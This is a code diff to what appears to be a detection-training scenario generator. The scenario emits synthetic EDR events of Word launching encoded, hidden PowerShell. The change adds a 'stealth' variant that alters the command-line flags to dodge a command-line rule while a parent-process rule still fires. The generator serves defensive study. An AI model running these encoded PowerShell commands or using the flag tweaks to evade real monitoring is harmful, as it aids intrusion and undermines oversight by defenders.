@@ -116,7 +116,7 @@ export const MACRO_EXECUTION_PLAN: AttackPlan =
           `Encoded PowerShell launched with a hidden window, and its parent is ${ATTACHMENT}'s WINWORD.EXE. No business process on this estate starts a scripting host from a word processor.`,
         reasoning: () =>
           "This is the finding, and it is a lineage finding rather than a command-line one. Encoded and hidden PowerShell is suspicious anywhere, but on its own it still competes with administrative tooling that legitimately hides windows and passes encoded arguments; the estate runs scheduled PowerShell all day. What has no legitimate counterpart is the parent. Office applications open, render and print documents -- nothing in that job requires spawning an interpreter -- so the pairing of a document host with a scripting host is close to unambiguous, which is rare and worth using. Confirm the parent's own image rather than trusting the pid, then go back to what that parent opened.",
-        build: (cast) => ({
+        build: (cast, _index, evasion) => ({
           type: "PROCESS_STARTED",
           source: "edr",
           subjectId: cast.subjectDevice.id,
@@ -124,8 +124,15 @@ export const MACRO_EXECUTION_PLAN: AttackPlan =
             deviceId: cast.subjectDevice.id,
             processId: "3204",
             image: POWERSHELL,
+            // A command-line rule keys on the loud shape -- the `-enc` flag and
+            // a hidden window. The stealth variant obfuscates the flag (`-e`)
+            // and drops the hidden window, so a rule pinned to `-enc` misses it
+            // while the lineage rule (a word processor spawned a scripting host)
+            // still fires: the parent is unchanged.
             commandLine:
-              "powershell.exe -nop -w hidden -ep bypass -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
+              evasion === "stealth"
+                ? "powershell.exe -nop -w 1 -ep bypass -e JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"
+                : "powershell.exe -nop -w hidden -ep bypass -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
             parentProcessId: "3120",
             parentImage: WINWORD,
             accountId:
